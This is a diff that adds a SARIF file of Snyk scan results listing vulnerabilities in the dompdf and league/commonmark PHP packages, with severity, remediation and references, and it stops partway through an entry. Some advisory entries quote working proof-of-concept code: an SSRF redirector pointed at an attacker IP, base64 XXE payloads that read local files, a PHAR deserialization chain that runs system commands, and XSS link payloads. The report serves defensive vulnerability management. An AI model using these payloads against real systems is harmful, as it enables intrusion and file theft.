@@ -1,0 +1,934 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Snyk Open Source",
+          "properties": {
+            "artifactsScanned": 17
+          },
+          "rules": [
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-2428942",
+              "shortDescription": {
+                "text": "High severity - Remote Code Execution (RCE) vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2022-28368) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to Remote Code Execution (RCE) by injecting `CSS` into the data. The file can be tricked into storing a malicious font with a `.php` file extension in its font cache, which can later be executed by accessing it from the web.\n# Remediation\nUpgrade `dompdf/dompdf` to version 1.2.1 or higher.\n# References\n- [Blog](https://positive.security/blog/dompdf-rce)\n- [Github Commit](https://github.com/dompdf/dompdf/pull/2808/commits/00b2b360ace768d58430f1cc5a20cb43d58bbc1a)\n- [Github Issues](https://github.com/dompdf/dompdf/issues/2598)\n- [GitHub Release](https://github.com/dompdf/dompdf/releases/tag/v1.2.1)\n- [Exploit DB](https://www.exploit-db.com/exploits/51270)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-94",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 8.1,
+                "security-severity": "8.1"
+              }
+            },
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-2936790",
+              "shortDescription": {
+                "text": "High severity - Server-side Request Forgery (SSRF) vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2022-0085) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to Server-side Request Forgery (SSRF). When DomPDF is being used with `isRemoteEnabled` and  `allow_url_fopen` set to `true`, and the IP addresses are restricted via a deny list, it is possible for an attacker to pass in a URL which bypasses this deny list but serves a 302 redirect response to a restricted IP address.\r\n\r\n\r\n# PoC:\r\n\r\npoc.php\r\n\r\n```php\r\n<?php\r\n\r\n//URL variable\r\n\r\n$url = \"http://[ATTACKER-IP]\";\r\n\r\nrequire_once 'dompdf/autoload.inc.php'; \r\n\r\nuse Dompdf\\Dompdf;\r\nuse Dompdf\\Options;\r\n\r\n$options = new Options();\r\n$options->set('isRemoteEnabled', true);\r\n\r\n$dompdf = new Dompdf($options);\r\n\r\n$host = parse_url($url, PHP_URL_HOST);\r\n$ip = gethostbyname($host);\r\n\r\nif ($ip !== \"127.0.0.1\") {\r\n   $dompdf->loadHtmlFile($url);\r\n   $dompdf->setPaper('A4', 'landscape'); \r\n   $dompdf->render(); \r\n   $dompdf->stream(); \r\n}\r\n\r\n?>\r\n```\r\n\r\nredirector.py - hosted on `http://[ATTACKER-IP]`\r\n\r\n```python\r\nimport sys\r\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\r\n\r\nif len(sys.argv)-1 != 2:\r\n    print(\"Usage: {} <port_number> <url>\".format(sys.argv[0]))\r\n    sys.exit()\r\n\r\nclass Redirect(BaseHTTPRequestHandler):\r\n   def do_GET(self):\r\n       self.send_response(302)\r\n       self.send_header('Location', sys.argv[2])\r\n       self.end_headers()\r\n\r\nHTTPServer((\"\", int(sys.argv[1])), Redirect).serve_forever()\r\n```\n# Remediation\nUpgrade `dompdf/dompdf` to version 2.0.0 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/dompdf/commit/bb1ef65011a14730b7cfbe73506b4bb8a03704bd)\n- [GitHub PR](https://github.com/dompdf/dompdf/pull/2859)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-918",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 3.7,
+                "security-severity": "3.7"
+              }
+            },
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-2953235",
+              "shortDescription": {
+                "text": "Medium severity - External Control of File Name or Path vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2022-2400) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to External Control of File Name or Path due to insufficient URI validation in `src/Image/Cache.php`, which allows an attacker to retrieve image files from the affected system.\n# Remediation\nUpgrade `dompdf/dompdf` to version 2.0.0 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/dompdf/commit/99aeec1efec9213e87098d42eb09439e7ee0bb6a)\n- [GitHub PR](https://github.com/dompdf/dompdf/pull/1903)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-73",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 5.3,
+                "security-severity": "5.3"
+              }
+            },
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-3033151",
+              "shortDescription": {
+                "text": "High severity - PHP Remote File Inclusion vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2022-41343) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to PHP Remote File Inclusion via `registerFont` in `FontMetrics.php`, due to a URI validation failure which does not halt font registration.\n# Remediation\nUpgrade `dompdf/dompdf` to version 2.0.1 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/dompdf/commit/66431c58017d5b1bdb9f6f772b9fbbc5e3d38dc2)\n- [GitHub Issue](https://github.com/dompdf/dompdf/issues/2994)\n- [GitHub PR](https://github.com/dompdf/dompdf/pull/2995)\n- [GitHub Release](https://github.com/dompdf/dompdf/releases/tag/v2.0.1)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-98",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 7.3,
+                "security-severity": "7.3"
+              }
+            },
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-3261241",
+              "shortDescription": {
+                "text": "High severity - Incorrect Behavior Order: Authorization Before Parsing and Canonicalization vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2023-23924) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to Incorrect Behavior Order: Authorization Before Parsing and Canonicalization due to URI validation failure when parsing SVG. The URI validation can be bypassed on SVG parsing by passing `<image>` tags with uppercase letters.\r\n\r\n# Vulnerable Behaviour\r\n\r\n```\r\nif ($type === \"svg\") {\r\n    $parser = xml_parser_create(\"utf-8\");\r\n    xml_parser_set_option($parser, XML_OPTION_CASE_FOLDING, false);\r\n    xml_set_element_handler(\r\n        $parser,\r\n        function ($parser, $name, $attributes) use ($options, $parsed_url, $full_url) {\r\n            if ($name === \"image\") {\r\n                $attributes = array_change_key_case($attributes, CASE_LOWER);\r\n```\r\nThis part will try to detect `<image>` tags in SVG, and will take the `href` to validate it against the `protocolAllowed` whitelist. However, the `$name` comparison with `image` is case sensitive, which means that such a tag in the SVG will pass : \r\n\r\n```\r\n<svg>\r\n    <Image xlink:href=\"phar:///foo\"></Image>\r\n</svg>\r\n```\r\n\r\nAs the tag is named `Image` and not `image`, it will not pass the condition to trigger the check.\r\n\r\nA correct solution would be to `strtolower` the `$name` before the check : \r\n\r\n```\r\nif (strtolower($name) === \"image\") {\r\n```\r\n\r\n# PoC\r\n\r\nParsing the following SVG file is sufficient to reproduce the vulnerability :\r\n\r\n```\r\n<svg>\r\n    <Image xlink:href=\"phar:///foo\"></Image>\r\n</svg>\r\n```\n# Remediation\nUpgrade `dompdf/dompdf` to version 2.0.2 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/dompdf/commit/7558f07f693b2ac3266089f21051e6b78c6a0c85)\n- [GitHub Release](https://github.com/dompdf/dompdf/releases/tag/v2.0.2)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-551",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 8.3,
+                "security-severity": "8.3"
+              }
+            },
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-3315269",
+              "shortDescription": {
+                "text": "High severity - Improper Input Validation vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2023-24813) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to Improper Input Validation when validating URI strings to parse SVG files in `Image/Cache.php`. This allows calling arbitrary URLs with arbitrary protocols. This is a bypass of CVE-2023-23924.\r\n\r\n**Note:** This is exploitable in PHP before version 8.0.0.\n# Remediation\nUpgrade `dompdf/dompdf` to version 2.0.3 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/dompdf/commit/95009ea98230f9b084b040c34e3869ef3dccc9aa)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-20",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 8.3,
+                "security-severity": "8.3"
+              }
+            },
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-6124861",
+              "shortDescription": {
+                "text": "High severity - Improper Input Validation vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2023-50262) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to Improper Input Validation via the SVG image parsing process. An attacker can send multiple requests that trigger infinite recursion through chained references between two or more SVG images, leading to memory exhaustion and potential system unresponsiveness.\n# PoC\nrecurse.html\r\n\r\n```php\r\n\r\n<img src=\"one.svg\">\r\n\r\n```\r\n\r\none.svg\r\n\r\n\r\n```php\r\n\r\n<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\">\r\n  <image href=\"two.svg\" />\r\n</svg>\r\n\r\n```\r\n\r\ntwo.svg\r\n\r\n```php\r\n\r\n<svg width=\"200\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\">\r\n  <image href=\"one.svg\" />\r\n</svg>\r\n\r\n```\n# Remediation\nUpgrade `dompdf/dompdf` to version 2.0.4 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/dompdf/commit/41cbac16f3cf56affa49f06e8dae66d0eac2b593)\n- [GitHub Release](https://github.com/dompdf/dompdf/releases/tag/v2.0.4)\n- [Vulnerable Code](https://github.com/dompdf/dompdf/blob/v2.0.3/src/Image/Cache.php#L136-L153)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-20",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 7.5,
+                "security-severity": "7.5"
+              }
+            },
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-8382096",
+              "shortDescription": {
+                "text": "Critical severity - XML External Entity (XXE) Injection vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2021-3902) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection through the SVG parser. An attacker can perform server-side request forgery, disclose internal image files, and execute PHAR deserialization attacks by manipulating XML input.\n\n**Note:**\n\nThis vulnerability is exploitable even if the `isRemoteEnabled` option is set to false.\n# PoC\n**Payload 1 - SSRF (only allow_url_fopen required)**\n\nThis embeds Google logo into the PDF document even when the `isRemoteEnabled` option is defaulted to false.\n\n```php\n<?php\n// Include autoloader \nrequire_once 'dompdf/autoload.inc.php'; \n\n// Reference the Dompdf namespace \nuse Dompdf\\Dompdf; \n\n$dompdf = new Dompdf();\n// Load HTML content \n$dompdf->loadHtml('<img src=\"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjxzdmcgeG1sbnM6c3ZnPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgd2lkdGg9IjIwMCIgaGVpZ2h0PSIyMDAiPgo8aW1hZ2UgaGVpZ2h0PSIyMDAiIHdpZHRoPSIyMDAiIHhsaW5rOmhyZWY9Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vaW1hZ2VzL2JyYW5kaW5nL2dvb2dsZWxvZ28vMXgvZ29vZ2xlbG9nb19jb2xvcl8yNzJ4OTJkcC5wbmciIC8+Cjwvc3ZnPg==\">');\n\n// (Optional) Setup the paper size and orientation\n$dompdf->setPaper('A4', 'landscape'); \n \n// Render the HTML as PDF \n$dompdf->render(); \n \n// Output the generated PDF to Browser \n$dompdf->stream(); \n\n?>\n```\n\n**Payload 2 - Image File disclosure (no requirements)**\n\nThis causes the `/var/www/html/index.jpg` file to be included into the file.\n\n```php\n<?php\n// Include autoloader \nrequire_once 'dompdf/autoload.inc.php'; \n\n// Reference the Dompdf namespace \nuse Dompdf\\Dompdf; \n\n$dompdf = new Dompdf();\n// Load HTML content \n$dompdf->loadHtml('<img src=\"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjxzdmcgeG1sbnM6c3ZnPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgd2lkdGg9IjIwMCIgaGVpZ2h0PSIyMDAiPgo8aW1hZ2UgaGVpZ2h0PSIyMDAiIHdpZHRoPSIyMDAiIHhsaW5rOmhyZWY9ImZpbGU6Ly8vdmFyL3d3dy9odG1sL2luZGV4LmpwZyIgLz4KPC9zdmc+\">');\n\n// (Optional) Setup the paper size and orientation\n$dompdf->setPaper('A4', 'landscape'); \n \n// Render the HTML as PDF \n$dompdf->render(); \n \n// Output the generated PDF to Browser \n$dompdf->stream(); \n\n?>\n```\n\n**Payload 3 - Insecure PHAR deserialization (only file upload of phar file required [can change extension])**\n\n```php\n<?php\n// Include autoloader \nrequire_once 'dompdf/autoload.inc.php'; \n\ninclude(\"phar-poc.php\");\n\n// Reference the Dompdf namespace \nuse Dompdf\\Dompdf; \n\n$dompdf = new Dompdf();\n\n// Load HTML content \n$dompdf->loadHtml('<img src=\"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjxzdmcgeG1sbnM6c3ZnPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgd2lkdGg9IjIwMCIgaGVpZ2h0PSIyMDAiPgo8aW1hZ2UgaGVpZ2h0PSIyMDAiIHdpZHRoPSIyMDAiIHhsaW5rOmhyZWY9InBoYXI6Ly8vdmFyL3d3dy9odG1sL3Rlc3QucGhhci90ZXN0LnR4dCIgLz4KPC9zdmc+\">');\n\n// (Optional) Setup the paper size and orientation\n$dompdf->setPaper('A4', 'landscape'); \n \n// Render the HTML as PDF \n$dompdf->render(); \n \n// Output the generated PDF to Browser \n$dompdf->stream(); \n\n?>\n```\n\n# Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n# Remediation\nUpgrade `dompdf/dompdf` to version 2.0.0 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/dompdf/commit/f56bc8e40be6c0ae0825e6c7396f4db80620b799)\n- [Vulnerable Code](https://github.com/dompdf/dompdf/blob/0ccafeb142dd04f556b43f1e8b5541aa06de1c26/src/Adapter/PDFLib.php#L1213-L1226)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-611",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 9.3,
+                "security-severity": "9.3"
+              }
+            },
+            {
+              "id": "SNYK-PHP-DOMPDFDOMPDF-8382097",
+              "shortDescription": {
+                "text": "Critical severity - Deserialization of Untrusted Data vulnerability in dompdf/dompdf"
+              },
+              "fullDescription": {
+                "text": "(CVE-2021-3838) dompdf/dompdf@1.2.0"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: dompdf/dompdf\n* Introduced through: snyk/phpgoof@0.0.0 and dompdf/dompdf@1.2.0\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › dompdf/dompdf@1.2.0\n# Overview\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data through the `file_get_contents` function. An attacker can execute arbitrary code by uploading a file with a malicious `phar://` protocol, leading to the deserialization and instantiation of arbitrary PHP objects.\n\n**Note:**\n\nThis can lead to remote code execution, especially when DOMPdf is used with frameworks with documented POP chains like Laravel or vulnerable developer code.\n# PoC\nSetup the following code in `/var/www/html`: `vuln.php` represents the use of DOMPdf functions and `phar-poc.php` represents code with a vulnerable POP chain.\n\n```php\n// vuln.php\n<?php\n// Include autoloader \nrequire_once 'dompdf/autoload.inc.php'; \n\n// Include vulnerable objects\ninclude(\"phar-poc.php\");\n\n// Reference the Dompdf namespace \nuse Dompdf\\Dompdf; \nuse Dompdf\\Options;\n\n$options = new Options();\n$options->set('isRemoteEnabled', true);\n$dompdf = new Dompdf($options);\n\n// Load HTML content \n$dompdf->loadHtml('<img src=\"phar://test.phar\">'); \n// (Optional) Setup the paper size and orientation \n$dompdf->setPaper('A4', 'landscape'); \n \n// Render the HTML as PDF \n$dompdf->render(); \n \n// Output the generated PDF to Browser \n//$dompdf->stream(); \n\n?>\n```\n\n```php\n// phar-poc.php\n<?php\n\nclass AnyClass {\n        public $data = null;\n        public function __construct($data) {\n                $this->data = $data;\n        }\n\n        function __destruct() {\n                system($this->data);\n        }\n}\n```\n\nThe PHAR payload is generated using the following exploit script:\n\n```php\n<?php\n\nclass AnyClass {\n        public $data = null;\n        public function __construct($data) {\n                $this->data = $data;\n        }\n\n        function __destruct() {\n                system($this->data);\n        }\n}\n\n// create new Phar\n$phar = new Phar('test.phar');\n$phar->startBuffering();\n$phar->addFromString('test.txt', 'text');\n$phar->setStub(\"\\xff\\xd8\\xff\\n<?php __HALT_COMPILER(); ?>\");\n\n// add object of any class as meta data\n$object = new AnyClass('whoami');\n$phar->setMetadata($object);\n$phar->stopBuffering();\n```\n\nGenerate with:\n\n```php\nphp --define phar.readonly=0 create_phar.php\n```\n\nand execute `vuln.php` with `php vuln.php`, noticing `whoami` being executed\n\nNote that after generating the PHAR exploit code, an attacker can rename it to whatever extension or filename they want, it is possible to rename it `test.phar` to `test.png` to bypass any file extension check by the developer and specify `phar://test.png` in the src attribute.\n\n# Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.\n  \n# Remediation\nUpgrade `dompdf/dompdf` to version 2.0.0 or higher.\n# References\n- [GitHub Commit](https://github.com/dompdf/dompdf/commit/99aeec1efec9213e87098d42eb09439e7ee0bb6a)\n- [Vulnerable Code](https://github.com/dompdf/dompdf/blob/master/src/Helpers.php#L853L871)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-502",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 9.3,
+                "security-severity": "9.3"
+              }
+            },
+            {
+              "id": "SNYK-PHP-LEAGUECOMMONMARK-173996",
+              "shortDescription": {
+                "text": "Medium severity - Cross-site Scripting (XSS) vulnerability in league/commonmark"
+              },
+              "fullDescription": {
+                "text": "league/commonmark@0.18.2"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: league/commonmark\n* Introduced through: snyk/phpgoof@0.0.0 and league/commonmark@0.18.2\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › league/commonmark@0.18.2\n# Overview\n[league/commonmark](https://packagist.org/packages/league/commonmark) is a PHP-based Markdown parser which supports the full CommonMark spec. It is based on the CommonMark JS reference implementation.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Malicious users can insert double-encoded HTML entities into their Markdown.\r\n\r\n# PoC:\r\nby `Colin O'Dell`\r\n\r\n`[XSS](javascript&amp;colon;alert%28&#039;XSS&#039;%29)`\r\n\r\nThis library would (correctly) unescape the `&amp`; entity to `&` during the parsing step. However, the renderer step would fail to properly re-escape the resulting `&colon;` string, thus producing the following malicious HTML output:\r\n\r\n`<p><a href=\"javascript&colon;alert('XSS')\">XSS</a></p>`\r\n\r\nBrowsers would interpret `&colon;` as a `:` character and allow the JS to be executed when the link is clicked.\n# Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n## Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\n\n## Affected environments\nThe following environments are susceptible to an XSS attack:\n\n* Web servers\n* Application servers\n* Web application environments\n\n## How to prevent\nThis section describes the top best practices designed to specifically protect your code: \n\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \n* Give users the option to disable client-side scripts.\n* Redirect invalid requests.\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n# Remediation\nUpgrade `league/commonmark` to version 0.18.3 or higher.\n# References\n- [GitHub Commit](https://github.com/thephpleague/commonmark/commit/6f16c6eb893f760d3b4f9a03c94c62653c4ac829)\n- [GitHub Commit](https://github.com/thephpleague/commonmark/commit/edde218c179b6503d153035b3801f14a9ada542b)\n- [GitHub Commit](https://github.com/thephpleague/commonmark/commit/f1453b9fdb516436d79ff17af555f8d6e2321472)\n- [GitHub Issue](https://github.com/thephpleague/commonmark/issues/353)\n"
+              },
+              "properties": {
+                "tags": [
+                  "security",
+                  "CWE-79",
+                  "composer"
+                ],
+                "cvssv3_baseScore": 6.5,
+                "security-severity": "6.5"
+              }
+            },
+            {
+              "id": "SNYK-PHP-LEAGUECOMMONMARK-174004",
+              "shortDescription": {
+                "text": "Medium severity - Cross-site Scripting (XSS) vulnerability in league/commonmark"
+              },
+              "fullDescription": {
+                "text": "(CVE-2019-10010) league/commonmark@0.18.2"
+              },
+              "help": {
+                "text": "",
+                "markdown": "* Package Manager: composer\n* Vulnerable module: league/commonmark\n* Introduced through: snyk/phpgoof@0.0.0 and league/commonmark@0.18.2\n### Detailed paths\n* _Introduced through_: snyk/phpgoof@0.0.0 › league/commonmark@0.18.2\n# Overview\n[league/commonmark](https://packagist.org/packages/league/commonmark) is a PHP-based Markdown parser which supports the full CommonMark spec. It is based on the CommonMark JS reference implementation.\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS). Attackers may be able to insert unsafe links into HTML by using double-encoded HTML entities that are not properly escaped during rendering. \r\n\r\n**Note: This is a different vulnerability than CVE-2018-20583.**\n# Details\n\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\n\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\n\nInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\n\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\n \nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \n\n## Types of attacks\nThere are a few methods by which XSS can be manipulated:\n\n|Type|Origin|Description|\n|--|--|--|\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\n|**Reflected**|Server|The attacker delivers a 